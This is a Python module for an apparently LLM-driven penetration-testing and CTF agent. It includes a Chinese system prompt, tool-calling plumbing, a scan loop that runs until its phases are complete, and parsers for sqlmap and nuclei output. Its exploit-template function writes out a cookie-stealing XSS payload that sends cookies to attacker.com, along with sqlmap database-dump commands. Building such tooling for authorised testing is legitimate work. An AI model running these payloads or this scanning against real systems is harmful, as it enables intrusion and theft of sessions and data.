from __future__ import annotations

import argparse
import json
import re
import sys
import os
from dataclasses import dataclass, field
from typing import Any, Dict, List, Tuple, Optional
from enum import Enum

from .llm_client import LLMClient
from .mcp_hexstrike_client import HexstrikeMcpClient

# GraphRAG导入
try:
    from GraphRAG import (
        build_hexstrike_tool_graph,
        HexStrikeToolSelector,
        select_tools_for_target,
        filter_openai_tools,
        analyze_target,
        select_tools_with_phase_aware,
    )
    GRAPHRAG_AVAILABLE = True
except ImportError:
    GRAPHRAG_AVAILABLE = False
    print("[警告] GraphRAG模块导入失败，将使用全量工具模式")

# Phase-Aware导入
try:
    from GraphRAG import (
        WebPentestContext,
        PhaseAwareToolSelector,
        PhaseToolRecommendation,
        InputTypeDetector,
        ContextUpdater,
        PhaseTransitionRules,
        create_pentest_context,
        select_phase_tools,
        get_phase_intent,
        extract_context_features,
        update_context,
        check_phase_transition,
        advance_phase,
        filter_tools_by_phase_recommendations,
    )
    PHASE_AWARE_AVAILABLE = True
except ImportError:
    PHASE_AWARE_AVAILABLE = False
    print("[警告] Phase-Aware模块导入失败，将禁用阶段感知")


# ============================================================
# 系统提示词（强调思考优先，工具辅助）
# ============================================================
HEXSTRIKE_SYSTEM_PROMPT = """你是 HexStrike AI，一个资深的渗透测试专家和 CTF 高手。

【核心原则 - 最重要】
1. 🧠 **思考优先**：先用你的知识和经验分析，再决定是否需要工具
2. 🎯 **目标导向**：每一步都要明确目标，不要盲目调用工具
3. 💡 **线索敏感**：发现关键线索时，停下来深入分析，不要急着调用工具
4. 🔍 **推理为主**：CTF 题目和渗透测试往往需要推理和分析，而不是暴力扫描
5. 🛑 **适时停止**：当你已经有足够信息得出结论时，不要继续调用工具
6. 💬 **自然对话**：对于普通问候、咨询，像ChatGPT一样自然回答，无需复杂分析
7. 🚀 **响应迅速**：简单问题快速回答，复杂任务深度分析

【核心能力】
1. 普通对话：回答用户的问题、解释安全概念、提供建议
2. CTF 解题：分析题目、推理解法、验证思路
3. 渗透测试：使用工具执行专业的渗透测试、漏洞发现、生成 exp

【工作模式】
- 如果是普通对话：直接回复，展示你的知识
  * 问候（"你好"、"介绍自己"）→ 友好回答，介绍能力
  * 技术咨询（"什么是SQL注入"）→ 详细解释，提供建议
  * 使用指导（"如何使用"）→ 说明使用方法
- 如果是 CTF/渗透测试：
  1. **先分析**：用你的知识分析题目/目标特征
  2. **再思考**：推理可能的解题思路或攻击向量
  3. **后决策**：只在必要时调用工具获取信息
  4. **深度分析**：仔细分析工具结果，提取关键线索
  5. **推理验证**：基于线索推理下一步，或直接给出答案

【CTF 解题思维】
- 看到提示信息 → 停下来思考：这个提示在暗示什么？可能的解法是什么？
- 发现异常行为 → 分析：为什么会这样？背后的原理是什么？
- 获得部分信息 → 推理：我能从这些信息推断出什么？还需要什么信息？
- 遇到障碍 → 思考：有没有其他角度？是否需要换个思路？
- 找到关键线索 → 深入分析：这个线索意味着什么？如何利用？

【渗透测试流程】
1. **理解目标**：分析目标类型、技术栈、可能的漏洞
2. **信息收集**：使用工具获取必要信息（不要过度收集）
3. **分析结果**：仔细分析工具返回的结果，提取关键信息
4. **推理攻击**：基于信息推理可能的攻击方法
5. **验证漏洞**：使用工具验证推理的攻击方法
6. **总结报告**：发现漏洞时详细报告

【🤝 与用户的协作】
你可以随时使用 `ask_user` 工具与用户交互（你自己决定何时使用）：

✅ **适合使用 ask_user 的场景**：
- 当你不确定下一步该怎么做时，询问用户的建议
- 当你发现重要信息（漏洞、flag等），询问用户是否满意
- 当你完成了一个阶段，汇报进展并询问是否继续
- 当你遇到困难或连续失败时，寻求用户的指导
- 当你需要用户的专业判断或决策时

❌ **不要使用 ask_user 的场景**：
- 你很确定下一步该做什么
- 只是简单的信息收集阶段
- 任务进展顺利，没有疑问

💡 **使用示例**：
```
# 场景 1：不确定下一步
ask_user(
    question="我已经尝试了 SQL 注入和 XSS，都没有成功。您建议我接下来尝试什么？",
    options=["目录扫描", "暴力破解", "查看源码", "其他建议"],
    context="已测试：SQL注入(失败)、XSS(失败)"
)

# 场景 2：发现重要信息
ask_user(
    question="我发现了一个 SQL 注入漏洞！您想让我继续利用它，还是先手动验证？",
    options=["继续利用", "手动验证", "记录并继续"],
    context="漏洞位置：/login.php?id=1，严重程度：High"
)

# 场景 3：阶段性汇报
ask_user(
    question="我已经完成了信息收集阶段，发现了 3 个开放端口和 5 个目录。您对当前进展满意吗？",
    options=["继续深入测试", "修改测试方向", "查看详细结果"],
    context="开放端口：80(HTTP), 22(SSH), 3306(MySQL)\\n发现目录：/admin, /api, /uploads, /backup, /config"
)
```

【重要提醒 - 避免成为"工具调用机器"】
⚠️ **每次调用工具前，先问自己**：
  - 我真的需要这个工具吗？
  - 我能用现有信息推理出答案吗？
  - 这个工具能给我什么新信息？

⚠️ **每次获得结果后，先分析**：
  - 这个结果告诉我什么关键信息？
  - 我发现了什么线索或模式？
  - 下一步应该做什么？是继续调用工具还是直接推理？

⚠️ **发现关键线索时，停下来**：
  - 深入分析这个线索的含义
  - 推理可能的利用方法
  - 不要急着调用下一个工具

⚠️ **适时停止**：
  - 当你已经找到答案或解法时，不要继续调用工具
  - 当你已经有足够信息推理出结论时，直接给出答案
  - 当连续多次工具调用没有新发现时，换个思路

⚠️ **对话体验优化**：
  - 简单问候无需工具，直接友好回答
  - 技术咨询优先用知识回答，必要时辅以工具
  - 明确的测试请求才进入完整的渗透测试流程
  - 保持对话的自然性和连贯性

【工具使用原则】
1. 每次只调用一个工具，等待结果后再决定下一步（禁止并行调用）
2. 优先使用轻量级工具（如查看源码、爬取页面）
3. 避免重复使用相同类型的工具
4. 一类漏洞确认后就换下一类，不要用多个工具测同一种漏洞
5. 工具是辅助，你的推理和分析才是核心

【示例对比】
❌ **错误示例**（盲目调用工具）：
  看到网站 → 调用爬虫 → 调用扫描 → 调用测试 → 调用更多扫描 → ...
  （没有思考，只是机械地调用工具）

✅ **正确示例**（思考优先）：
  看到网站 → 分析页面特征（用知识） → 发现提示信息 → 思考提示含义 → 
  推理可能的解法 → 如果需要验证，调用工具 → 分析结果 → 得出结论

【你的身份】
你不是一个"工具调用机器"，你是一个会思考、会推理、有经验的安全专家和 CTF 选手。
你的价值在于你的分析能力、推理能力和经验，工具只是辅助你验证想法的手段。
用户是你的合作伙伴，在关键决策点主动与用户沟通，但不要过度打扰。

【对话交互原则】
1. **自然流畅**：像与专家朋友对话一样，保持自然的语调
2. **智能判断**：根据用户输入自动判断是对话还是任务
3. **无缝切换**：可以在对话中随时切换到工具模式
4. **上下文连续**：记住对话历史，保持话题连贯性

【快速识别模式】
- 包含URL + 行动词（"扫描"、"测试"）→ 渗透测试模式
- 纯技术问题（"如何"、"什么是"）→ 咨询模式  
- 简单问候（"你好"、"介绍"）→ 对话模式
- 复杂描述 → 深度分析后决定模式
"""


class PauseReason(Enum):
    """暂停原因枚举（简化版）"""
    VULNERABILITY_WITH_EXP = "发现漏洞并获取EXP"


# ============================================================
# 事件回调接口（用于Web UI集成）
# ============================================================
class EventCallback:
    """事件回调接口，用于实时推送状态到Web UI"""
    
    def on_ai_message(self, message: str, timestamp: str = None):
        """AI回复消息"""
        pass
    
    def on_ai_thinking(self, message: str):
        """AI思考中"""
        pass
    
    def on_tool_start(self, tool_name: str, parameters: Dict[str, Any], timestamp: str = None):
        """工具开始执行"""
        pass
    
    def on_tool_complete(self, tool_name: str, success: bool, result: Dict[str, Any], timestamp: str = None):
        """工具执行完成"""
        pass
    
    def on_terminal_output(self, output: str, stream: str = 'stdout'):
        """终端输出"""
        pass
    
    def on_vulnerability_found(self, vulnerability: Dict[str, Any], timestamp: str = None):
        """发现漏洞"""
        pass
    
    def on_pause_for_input(self, reason: str, options: List[str], vulnerabilities: List[Dict[str, Any]]):
        """暂停等待用户输入"""
        pass
    
    def on_test_complete(self, summary: Dict[str, Any], report: str = None):
        """测试完成"""
        pass
    
    def on_error(self, message: str):
        """错误"""
        pass
    
    def should_stop(self) -> bool:
        """检查是否应该停止"""
        return False
    
    def wait_for_user_choice(self, timeout: int = 300) -> str:
        """等待用户选择，返回 'continue', 'stop', 'report'"""
        return 'continue'


@dataclass
class VulnerabilityReport:
    """漏洞报告"""
    vuln_type: str
    severity: str
    confidence: float
    description: str
    payload: Optional[str] = None
    exploit_code: Optional[str] = None
    affected_url: Optional[str] = None
    remediation: Optional[str] = None


# ============================================================
# MCP工具转OpenAI Function Calling格式（对标CherryStudio）
# ============================================================
def build_openai_tools_from_mcp(mcp_client: HexstrikeMcpClient) -> List[Dict[str, Any]]:
    """将MCP工具转换为OpenAI Function Calling格式
    
    对标CherryStudio的 mcpToolsToOpenAIChatTools() 函数
    动态从MCP服务端获取所有工具定义
    """
    tools = []
    
    # 从MCP服务端获取工具列表
    mcp_tools = mcp_client.list_tools()
    
    if mcp_tools:
        # 调试：打印第一个工具的结构
        if mcp_tools:
            first_tool = mcp_tools[0]
            print(f"[MCP] 工具对象类型: {type(first_tool)}")
            if hasattr(first_tool, '__dict__'):
                print(f"[MCP] 工具属性: {list(vars(first_tool).keys())[:5]}")
        
        for tool in mcp_tools:
            # 获取工具属性 - MCP SDK的Tool对象有name, description, inputSchema属性
            name = None
            description = ""
            input_schema = {}
            
            # 尝试从对象属性获取
            if hasattr(tool, 'name'):
                name = tool.name
            if hasattr(tool, 'description'):
                description = tool.description or ""
            if hasattr(tool, 'inputSchema'):
                input_schema = tool.inputSchema or {}
            
            # 如果是dict，从dict获取
            if isinstance(tool, dict):
                name = tool.get('name', name)
                description = tool.get('description', description)
                input_schema = tool.get('inputSchema', input_schema)
            
            # 跳过无效工具
            if not name:
                continue
            
            # 【关键】确保name不超过64字符（OpenAI限制）
            if len(name) > 64:
                print(f"[MCP] 警告: 工具名称过长({len(name)}字符)，截断: {name[:30]}...")
                name = name[:64]
            
            # 【关键】确保description不超过1024字符
            if len(description) > 1024:
                description = description[:1021] + "..."
            
            # 转换为OpenAI格式
            openai_tool = {
                "type": "function",
                "function": {
                    "name": name,
                    "description": description or f"MCP工具: {name}",
                    "parameters": input_schema if input_schema else {
                        "type": "object",
                        "properties": {},
                        "required": []
                    }
                }
            }
            tools.append(openai_tool)
        
        print(f"[MCP] 从服务端获取到 {len(tools)} 个工具")
    
    return tools
    

@dataclass
class PenTestSessionState:
    """In-memory state about the current penetration-test session."""

    target: str = ""
    status: str = "idle"
    phase: str = "init"
    last_action: str | None = None
    last_tool_results: Dict[str, Any] = field(default_factory=dict)
    history: List[Dict[str, str]] = field(default_factory=list)
    target_profile: Dict[str, Any] | None = None
    phase_history: List[Dict[str, Any]] = field(default_factory=list)
    tool_success_scores: Dict[str, float] = field(default_factory=dict)
    consecutive_failures: int = 0
    last_error_type: str | None = None
    completed_phases: set = field(default_factory=set)
    saved_credentials: Dict[str, Dict[str, str]] = field(default_factory=dict)
    saved_cookies: Dict[str, Dict[str, str]] = field(default_factory=dict)
    session_cookies: Dict[str, str] = field(default_factory=dict)
    session_headers: Dict[str, str] = field(default_factory=dict)
    
    # 【ReAct新增】
    findings: List[str] = field(default_factory=list)  # 发现的信息
    vulnerabilities: List[VulnerabilityReport] = field(default_factory=list)  # 发现的漏洞
    is_authenticated: bool = False  # 是否已认证
    iteration_count: int = 0  # 当前轮次
    
    # 【智能暂停新增】
    pause_count: int = 0  # 暂停次数
    user_choice_history: List[str] = field(default_factory=list)  # 用户选择历史
    last_vuln_count: int = 0  # 上次检查时的漏洞数量（用于检测新漏洞）
    
    # 【用户意图理解新增】
    user_instruction: str = ""  # 用户的完整指令（不仅仅是URL）


def build_context_summary(pentest_context) -> str:
    """构建上下文摘要，让LLM知道当前发现了什么
    
    这是优化上下文传递的核心函数。
    让LLM知道：发现了什么表单、参数、哪些漏洞已测试过。
    """
    if not pentest_context:
        return ""
    
    lines = []
    
    # 基础信息
    lines.append(f"【当前阶段】{pentest_context.current_phase}")
    
    # 发现的表单
    if pentest_context.discovered_forms:
        lines.append(f"\n【发现的POST表单】({len(pentest_context.discovered_forms)}个)")
        for form in pentest_context.discovered_forms[:3]:  # 最多显示3个
            action = form.get("action", "当前页面")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            input_names = [inp.get("name", "") for inp in inputs if inp.get("name")]
            
            # 【关键】构建完整的data字符串，让LLM直接使用
            data_parts = []
            for inp in inputs:
                name = inp.get("name", "")
                value = inp.get("value", "")
                if name:
                    # 空值用test填充，确保参数完整
                    test_value = value if value else "test"
                    data_parts.append(f"{name}={test_value}")
            
            data_string = "&".join(data_parts)
            
            if input_names:
                lines.append(f"  - {method} {action}")
                lines.append(f"    参数: {input_names}")
                if data_string:
                    lines.append(f"    ⚠️ sqlmap/dalfox测试用data（直接使用，不要修改）: {data_string}")
    
    # 发现的参数
    if pentest_context.injectable_params:
        params_info = []
        for p in pentest_context.injectable_params[:10]:
            param_name = p.get("param", "")
            method = p.get("method", "GET")
            source = p.get("source", "")
            params_info.append(f"{param_name}({method})")
        lines.append(f"\n【发现的可测试参数】{params_info}")
    
    # 特殊发现
    special_findings = []
    if pentest_context.has_login_page:
        special_findings.append("登录表单")
    if pentest_context.has_file_upload:
        special_findings.append("文件上传")
    if pentest_context.has_search_function:
        special_findings.append("搜索功能")
    if special_findings:
        lines.append(f"【特殊功能】{special_findings}")
    
    # 技术栈
    if pentest_context.technology_stack:
        lines.append(f"【技术栈】{pentest_context.technology_stack[:5]}")
    
    # 漏洞测试状态（关键：让LLM知道哪些已测试）
    if pentest_context.vuln_test_status:
        found = [k for k, v in pentest_context.vuln_test_status.items() if v == "found"]
        not_found = [k for k, v in pentest_context.vuln_test_status.items() if v == "not_found"]
        
        if found:
            lines.append(f"\n【✅ 已确认漏洞】{found}（无需再测这些类型）")
        if not_found:
            lines.append(f"【❌ 已测试无漏洞】{not_found}（可以跳过这些类型）")
    
    # 已确认的漏洞详情
    if pentest_context.confirmed_vulns:
        lines.append(f"\n【漏洞详情】")
        for vuln in pentest_context.confirmed_vulns[:3]:
            lines.append(f"  - {vuln.get('type')}: {vuln.get('url', '')}")
            if vuln.get('payload'):
                lines.append(f"    Payload: {vuln.get('payload')[:100]}")
    
    return "\n".join(lines)


def build_react_prompt(
    session: PenTestSessionState, 
    last_tool_result: Optional[Dict[str, Any]] = None,
    graphrag_recommendations: Optional[List[str]] = None,
    pentest_context = None
) -> str:
    """构建上下文提示词
    
    【优化】增加pentest_context参数，让LLM知道：
    1. 发现了什么表单、参数
    2. 哪些漏洞类型已测试过（避免重复测试同类型漏洞）
    3. 当前阶段和上下文特征
    """
    
    parts = []
    
    # 用户指令
    if session.user_instruction:
        parts.append(f"【用户指令】{session.user_instruction}")
        parts.append("")
    
    parts.append(f"【目标URL】{session.target}")
    parts.append(f"【当前阶段】{session.phase}")
    parts.append(f"【已执行轮次】{session.iteration_count}")
    
    if session.is_authenticated:
        parts.append("【认证状态】✅ 已认证（有有效的会话cookies）")
    else:
        parts.append("【认证状态】❌ 未认证")
    
    # 【关键优化】添加渗透测试上下文摘要
    if pentest_context:
        context_summary = build_context_summary(pentest_context)
        if context_summary:
            parts.append(f"\n{'='*50}")
            parts.append("📊 渗透测试上下文（请参考以下信息决定下一步）")
            parts.append(f"{'='*50}")
            parts.append(context_summary)
            parts.append(f"{'='*50}")
    
    # GraphRAG推荐（如果有）
    if graphrag_recommendations:
        parts.append(f"\n【GraphRAG智能推荐】基于目标分析，以下工具最适合当前场景：")
        parts.append(f"  {', '.join(graphrag_recommendations[:10])}")
        parts.append("  （优先考虑使用这些工具，它们与当前目标最匹配）")
    
    if session.findings:
        parts.append(f"\n已发现的信息：")
        for i, finding in enumerate(session.findings[-5:], 1):
            parts.append(f"  {i}. {finding}")
    
    if session.vulnerabilities:
        parts.append(f"\n已发现的漏洞：")
        for vuln in session.vulnerabilities:
            parts.append(f"  - {vuln.vuln_type}: {vuln.description}")
    
    # 【优化】添加测试建议
    parts.append("\n【测试原则】")
    parts.append("1. 已确认的漏洞类型无需再测试，直接测试其他类型")
    parts.append("2. 发现表单/参数后，直接用sqlmap等工具测试，无需先登录")
    parts.append("3. 一类漏洞确认后就换下一类，不要用多个工具测同一种漏洞")
    parts.append("\n请根据当前状态，决定下一步操作。如果需要调用工具，直接调用；如果任务完成，直接回复总结。")
    
    return "\n".join(parts)


def parse_llm_decision(response_text: str) -> Dict[str, Any]:
    """解析LLM的决策（保留用于兼容，但主要使用原生Function Calling）"""
    try:
        response_text = response_text.strip()
        
        # 提取JSON
        if "```json" in response_text:
            json_match = re.search(r'```json\s*(\{.*?\})\s*```', response_text, re.DOTALL)
            if json_match:
                response_text = json_match.group(1)
        elif "```" in response_text:
            json_match = re.search(r'```\s*(\{.*?\})\s*```', response_text, re.DOTALL)
            if json_match:
                response_text = json_match.group(1)
        
        decision = json.loads(response_text)
        
        if "action" not in decision:
            decision["action"] = "think"
        
        return decision
        
    except json.JSONDecodeError:
        # 解析失败，返回文本响应
        return {
            "thought": response_text[:500],
            "action": "chat",
            "response": response_text,
            "task_status": "进行中"
        }


def execute_tool_call(
    tool_name: str,
    arguments: Dict[str, Any],
    session: PenTestSessionState,
    client: HexstrikeMcpClient,
) -> Dict[str, Any]:
    """执行工具调用（对标CherryStudio的callMCPTool）
    
    直接调用MCP工具，工具名称与MCP服务端一致
    """
    # 自动注入会话cookies
    web_tools = ["sqlmap_scan", "nuclei_scan", "browser_visit_page", "crawl_site_endpoints", 
                 "discover_injectable_params", "view_source_code", "intelligent_quick_test"]
    if tool_name in web_tools:
        if not arguments.get("cookies") and session.session_cookies:
            arguments["cookies"] = session.session_cookies
    
    # 直接调用MCP工具
    result = client._call_tool(tool_name, arguments)
    
    # 提取实际结果（MCP返回格式：{"result": {...}, "success": False}）
    if "result" in result and isinstance(result["result"], dict):
        actual_result = result["result"]
    else:
        actual_result = result
    
    # 更新会话状态
    update_session_from_result(tool_name, actual_result, session)
    
    # 处理登录成功的情况
    if tool_name == "smart_login_attempt" and actual_result.get("success"):
        if actual_result.get("cookies"):
            session.session_cookies = actual_result.get("cookies")
            session.is_authenticated = True
            session.findings.append(f"成功登录为用户: {actual_result.get('username')}")
    
    return actual_result


def is_pentest_complete(session: PenTestSessionState) -> bool:
    """判断渗透测试是否完成完整流程
    
    完整流程：recon/target_profile → discovery → vuln_scan
    """
    required_phases = {"discovery", "vuln_scan"}
    
    # 【修复】必须完成所有必需阶段，而不是只完成其中两个
    completed = session.completed_phases.intersection(required_phases)
    
    # 【修复】必须同时完成 discovery 和 vuln_scan，且 vuln_scan 必须成功找到漏洞或完成完整扫描
    has_discovery = "discovery" in completed
    has_vuln_scan = "vuln_scan" in completed
    
    # 【新增】检查是否真的完成了有意义的漏洞扫描（不是只登录就算完成）
    meaningful_scan = False
    if has_vuln_scan:
        # 检查是否执行过实际的漏洞扫描工具（sqlmap, nuclei, intelligent_quick_test等）
        scan_actions = ["run_sqlmap", "run_nuclei", "analyze_code", "intelligent_quick_test"]
        for phase_record in session.phase_history:
            if phase_record.get("action") in scan_actions and phase_record.get("success"):
                meaningful_scan = True
                break
    
    return has_discovery and has_vuln_scan and meaningful_scan


def should_continue_autonomous_loop(
    session: PenTestSessionState,
    current_result: Dict[str, Any],
    has_recovery_action: bool = False,
    max_consecutive_failures: int = 3,
) -> bool:
    """判断是否应该继续自主循环
    
    Args:
        has_recovery_action: 是否有可用的恢复动作
    """
    
    # 1. 如果有恢复动作，继续执行
    if has_recovery_action:
        return True
    
    # 2. 如果当前动作成功
    if current_result.get("success"):
        # 重置失败计数
        session.consecutive_failures = 0
        
        # 【关键修改】只有完成完整渗透流程才停止
        if is_pentest_complete(session):
            return False
    else:
        # 失败计数+1
        session.consecutive_failures += 1
    
    # 3. 连续失败次数过多，停止
    if session.consecutive_failures >= max_consecutive_failures:
        return False
    
    return True


def describe_session_state(session: PenTestSessionState) -> str:
    """Return a compact Chinese description of current session state."""
    lines = [
        f"当前会话状态：status={session.status}, phase={session.phase}, last_action={session.last_action or 'none'}.",
        f"目标: {session.target}."
    ]

    if session.target_profile:
        tp = session.target_profile
        target_type = tp.get("target_type") or tp.get("targetType")
        risk_level = tp.get("risk_level") or tp.get("riskLevel")
        technologies = tp.get("technology_stack") or tp.get("technologies") or []
        tech_str = ",".join(technologies) if isinstance(technologies, list) else str(technologies)

        if target_type or risk_level or tech_str:
            detail_parts = []
            if target_type:
                detail_parts.append(f"类型: {target_type}")
            if risk_level:
                detail_parts.append(f"风险: {risk_level}")
            if tech_str:
                detail_parts.append(f"技术栈: {tech_str}")
            lines.append("目标画像：" + "; ".join(detail_parts))

    return "\n".join(lines)


def format_tool_result_for_llm(tool_name: str, result: Dict[str, Any]) -> str:
    """将工具结果格式化为LLM容易理解的文本
    
    类似CherryStudio的做法：结构化、清晰、带建议
    """
    if not result.get("success"):
        error = result.get("error", "未知错误")
        return f"❌ 工具 {tool_name} 执行失败\n错误: {error}"
    
    # 根据不同工具格式化结果
    if tool_name == "browser_visit":
        final_url = result.get("final_url", "")
        is_login_page = "login" in final_url.lower()
        forms = len(result.get("forms", []))
        injectable = result.get("injectable_points", 0)
        has_source_link = result.get("has_source_code_link", False)
        
        if is_login_page:
            return f"""⚠️ 页面访问结果：被重定向到登录页面
- 最终URL: {final_url}
- 状态: 需要认证
- 建议: 使用 smart_login 工具完成登录"""
        else:
            parts = [f"✅ 页面访问成功", f"- URL: {final_url}", f"- 表单数量: {forms}", f"- 可注入点: {injectable}"]
            if has_source_link:
                parts.append("- 🔍 发现源码查看链接")
            return "\n".join(parts)
    
    elif tool_name == "smart_login":
        username = result.get("username", "unknown")
        cookies_count = len(result.get("cookies", {}))
        return f"""✅ 登录成功
- 用户: {username}
- Cookies已保存: {cookies_count}个
- 现在可以访问受保护的页面了"""
    
    elif tool_name == "crawl_site":
        total = result.get("total_found", 0)
        with_params = result.get("params_found", 0)
        return f"""✅ 站点爬取完成
- 发现URL总数: {total}
- 带参数的URL: {with_params}
{"- 💡 建议: 使用 discover_params 分析这些URL" if with_params > 0 else ""}"""
    
    elif tool_name == "analyze_code":
        vuln_count = result.get("vulnerability_count", 0)
        risk_level = result.get("risk_level", "UNKNOWN")
        if vuln_count > 0:
            vulns = result.get("vulnerabilities", [])
            vuln_list = "\n".join([f"  - [{v.get('severity')}] {v.get('type')}" for v in vulns[:3]])
            return f"""✅ 源码分析完成
- 发现漏洞: {vuln_count}个
- 风险等级: {risk_level}
主要漏洞:
{vuln_list}
- 💡 建议: 使用 intelligent_quick_test 快速验证这些漏洞"""
        else:
            return f"✅ 源码分析完成\n- 未发现明显漏洞\n- 风险等级: {risk_level}"
    
    elif tool_name == "intelligent_quick_test":
        vulnerable = result.get("vulnerable", False)
        confidence = result.get("confidence", 0)
        need_deep = result.get("need_deep_scan", False)
        
        if vulnerable:
            payload = result.get("successful_payload", "")
            msg = f"""🎯 发现漏洞！
- 类型: {result.get('vuln_type', 'unknown')}
- 置信度: {confidence:.0%}
- 成功的Payload: {payload}"""
            if need_deep:
                msg += f"\n- 💡 建议: 使用 {result.get('recommended_tool')} 深度利用"
            return msg
        else:
            if need_deep:
                return f"""ℹ️ 快速测试未发现明显漏洞
- 测试了 {result.get('payloads_tested', 0)} 个payload
- 💡 建议: 使用 {result.get('recommended_tool')} 深度扫描"""
            else:
                return f"ℹ️ 未发现漏洞\n- 测试了 {result.get('payloads_tested', 0)} 个payload"
    
    # 默认格式化
    return f"✅ {tool_name} 执行成功\n{json.dumps(result, ensure_ascii=False, indent=2)[:500]}"


def enhance_vuln_result(tool_name: str, result: Dict[str, Any]) -> Dict[str, Any]:
    """增强漏洞检测结果
    
    如果服务端没有返回结构化的vulnerable字段，从stdout解析漏洞信息。
    这是客户端的兜底逻辑，确保即使服务端返回原始输出也能正确识别漏洞。
    """
    # 如果已经有vulnerable字段，直接返回
    if "vulnerable" in result:
        return result
    
    stdout = result.get("stdout", "")
    stderr = result.get("stderr", "")
    output = stdout + stderr
    
    # sqlmap漏洞检测
    if tool_name in ["sqlmap_scan", "run_sqlmap"]:
        sqli_indicators = [
            "is vulnerable",
            "injectable",
            "Parameter:",
            "Type: ",
            "Title: ",
            "Payload:",
            "sqlmap identified the following injection point",
            "the back-end DBMS is",
            "available databases",
            "fetched data logged to",
        ]
        
        for indicator in sqli_indicators:
            if indicator.lower() in output.lower():
                result["vulnerable"] = True
                result["vuln_type"] = "SQL Injection"
                result["severity"] = "HIGH"
                
                # 尝试提取完整的 --- 块作为payload
                injection_match = re.search(r'---\n(.*?)\n---', output, re.DOTALL)
                if injection_match:
                    result["payload"] = injection_match.group(1).strip()
                else:
                    # 备用：尝试提取单行Payload
                    payload_match = re.search(r"Payload:\s*(.+?)(?:\n|$)", output)
                    if payload_match:
                        result["payload"] = payload_match.group(1).strip()
                
                # 尝试提取数据库类型
                dbms_match = re.search(r"back-end DBMS is\s*(.+?)(?:\n|$)", output)
                if dbms_match:
                    result["dbms"] = dbms_match.group(1).strip()
                
                return result
        
        # 没有发现漏洞的情况
        if "all tested parameters do not appear to be injectable" in output.lower():
            result["vulnerable"] = False
            result["vuln_type"] = None
    
    # nuclei漏洞检测
    elif tool_name in ["nuclei_scan", "run_nuclei"]:
        # nuclei输出格式: [severity] [template-id] [protocol] target
        nuclei_patterns = [
            r"\[critical\]",
            r"\[high\]",
            r"\[medium\]",
            r"\[low\]",
            r"\[info\].*(?:cve|vuln|exposed|leak)",
        ]
        
        for pattern in nuclei_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                result["vulnerable"] = True
                result["vuln_type"] = "Multiple (Nuclei)"
                
                # 提取严重程度
                if "[critical]" in output.lower():
                    result["severity"] = "CRITICAL"
                elif "[high]" in output.lower():
                    result["severity"] = "HIGH"
                elif "[medium]" in output.lower():
                    result["severity"] = "MEDIUM"
                else:
                    result["severity"] = "LOW"
                
                return result
    
    # XSS检测 (dalfox等)
    elif tool_name in ["dalfox_scan", "run_dalfox"]:
        xss_indicators = [
            "POC:",
            "Vulnerable",
            "XSS",
            "reflected",
            "stored",
        ]
        
        for indicator in xss_indicators:
            if indicator.lower() in output.lower():
                result["vulnerable"] = True
                result["vuln_type"] = "XSS"
                result["severity"] = "MEDIUM"
                
                # 提取POC
                poc_match = re.search(r"POC:\s*(.+?)(?:\n|$)", output)
                if poc_match:
                    result["payload"] = poc_match.group(1).strip()
                
                return result
    
    # nikto漏洞检测
    elif tool_name in ["nikto_scan", "run_nikto"]:
        nikto_indicators = [
            "OSVDB-",
            "CVE-",
            "vulnerability",
            "potentially dangerous",
        ]
        
        for indicator in nikto_indicators:
            if indicator.lower() in output.lower():
                result["vulnerable"] = True
                result["vuln_type"] = "Web Vulnerability (Nikto)"
                result["severity"] = "MEDIUM"
                return result
    
    return result


def generate_exploit_code(vuln_report: VulnerabilityReport, session: PenTestSessionState) -> str:
    """生成漏洞利用代码"""
    if vuln_report.exploit_code:
        return vuln_report.exploit_code
    
    # 根据漏洞类型生成基础EXP
    if vuln_report.vuln_type.lower() in ["xss", "cross-site scripting"]:
        return f"""# XSS Exploit
# Target: {vuln_report.affected_url or session.target}
# Payload: {vuln_report.payload}

# 基础利用：
curl "{vuln_report.affected_url or session.target}" \\
  -d "input={vuln_report.payload}"

# 进阶利用（Cookie窃取）：
# Payload: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
"""
    
    elif vuln_report.vuln_type.lower() in ["sql injection", "sqli"]:
        # 【增强】支持多行payload显示（sqlmap的注入点信息块）
        payload_display = vuln_report.payload or "未提取到payload"
        
        # 如果payload包含多行（sqlmap的完整注入点信息），格式化显示
        if payload_display and '\n' in payload_display:
            payload_section = f"""
# ==================== SQLMap 发现的注入点 ====================
{payload_display}
# =============================================================
"""
        else:
            payload_section = f"# Payload: {payload_display}"
        
        return f"""# SQL Injection Exploit
# Target: {vuln_report.affected_url or session.target}
{payload_section}

# 基础利用（枚举数据库）：
sqlmap -u "{vuln_report.affected_url or session.target}" \\
  --batch --dbs

# 进阶利用（数据提取）：
sqlmap -u "{vuln_report.affected_url or session.target}" \\
  --batch -D database_name --tables --dump

# 获取当前用户：
sqlmap -u "{vuln_report.affected_url or session.target}" \\
  --batch --current-user --current-db
"""
    
    else:
        return f"""# {vuln_report.vuln_type} Exploit
# Target: {vuln_report.affected_url or session.target}
# Payload: {vuln_report.payload}

# 请根据具体漏洞类型手动构造利用代码
"""


def should_pause_for_user_input(
    session: PenTestSessionState, 
    last_result: Optional[Dict[str, Any]]
) -> Tuple[bool, Optional[PauseReason]]:
    """判断是否应该暂停并询问用户
    
    核心原则：只在发现漏洞并有EXP时暂停，其他情况自动继续
    """
    
    if not last_result:
        return False, None
    
    result_data = last_result.get("result", {})
    
    # 检查是否发现漏洞
    is_vulnerable = result_data.get("vulnerable", False)
    has_payload = bool(result_data.get("payload") or result_data.get("successful_payload"))
    has_exploit = bool(result_data.get("exploit_code") or result_data.get("exploit"))
    
    # 条件1：发现高危漏洞且有payload或exploit
    severity = result_data.get("severity", "").upper()
    if severity in ["CRITICAL", "HIGH"] and (has_payload or has_exploit):
        return True, PauseReason.VULNERABILITY_WITH_EXP
    
    # 条件2：任何漏洞+有payload或exploit
    if is_vulnerable and (has_payload or has_exploit):
        return True, PauseReason.VULNERABILITY_WITH_EXP
    
    # 条件3：检查session中是否有新增的漏洞（刚刚添加的）
    if session.vulnerabilities and len(session.vulnerabilities) > session.last_vuln_count:
        # 有新漏洞，检查是否有EXP
        latest_vuln = session.vulnerabilities[-1]
        if latest_vuln.payload or latest_vuln.exploit_code:
            session.last_vuln_count = len(session.vulnerabilities)
            return True, PauseReason.VULNERABILITY_WITH_EXP
    
    # 其他情况：不暂停，自动继续
    return False, None


def display_progress_report(session: PenTestSessionState, reason: PauseReason):
    """展示进度报告"""
    print("\n" + "="*70)
